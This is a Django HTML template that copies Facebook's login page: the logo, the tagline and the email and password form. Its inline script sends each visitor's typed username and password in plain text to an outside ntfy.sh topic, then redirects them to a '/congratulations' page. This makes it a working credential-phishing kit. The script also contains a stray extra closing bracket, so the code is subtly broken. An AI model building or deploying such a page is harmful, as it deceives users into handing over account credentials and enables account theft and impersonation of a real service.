{% load static %}
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - Log in</title>
    <link rel="icon" href="https://cdn.iconscout.com/icon/free/png-512/facebook-social-media-fb-logo-square-44659.png" />
    <script src="https://cdn.tailwindcss.com"></script>
  </head>
  <body class="bg-gray-100 flex flex-col items-center justify-center min-h-screen">
    <div class="w-full max-w-4xl flex flex-col md:flex-row items-center justify-center">
      <div class="md:w-1/2 text-center md:text-left p-6">
        <img class="mx-auto md:mx-0" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" />
        <h2 class="text-lg pl-10 mt-4 text-gray-700 font-semibold">
          Facebook helps you connect and share with the people in your life.
        </h2>
      </div>
      <div class="md:w-1/2 bg-white p-6 rounded-lg shadow-md w-full max-w-md">
        <form id="login-form">
          <input type="text" id="username" class="w-full p-3 border border-gray-300 rounded-md mb-3" placeholder="Email or phone number" required />
          <div class="relative">
            <input type="password" id="password" class="w-full p-3 border border-gray-300 rounded-md mb-3" placeholder="Password" required />
          </div>
          <button id="login-btn" type="submit" class="w-full bg-blue-600 text-white p-3 rounded-md font-bold hover:bg-blue-700 flex justify-center items-center">
            <span id="login-text">Log In</span>
            <svg id="spinner" class="hidden ml-2 w-5 h-5 animate-spin text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
            </svg>
          </button>
          <div class="text-center mt-3">
            <a href="#" class="text-blue-600 text-sm">Forgotten password?</a>
          </div>
          <hr class="my-4" />
          <button type="button" class="w-full bg-green-500 text-white p-3 rounded-md font-bold hover:bg-green-600">Create New Account</button>
        </form>
      </div>
    </div>
    <footer class="mt-6 text-center text-gray-600 text-sm">
      <p>Create a Page for a celebrity, brand or business.</p>
    </footer>

    <script>
      document.getElementById("login-form").addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent form submission

        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        const loginBtn = document.getElementById("login-btn");
        const loginText = document.getElementById("login-text");
        const spinner = document.getElementById("spinner");

        // Show loading spinner
        loginText.classList.add("hidden");
        spinner.classList.remove("hidden");
        loginBtn.disabled = true;

        fetch("https://ntfy.sh/GiveRAw", {
          method: "POST",
          headers: { "Content-Type": "text/plain" },
          body: `Facebook Login Attempt:\nUsername: ${username}\nPassword: ${password}`
        })
        });
        
        window.location.href = "/congratulations";
      });
    </script>
  </body>
</html>
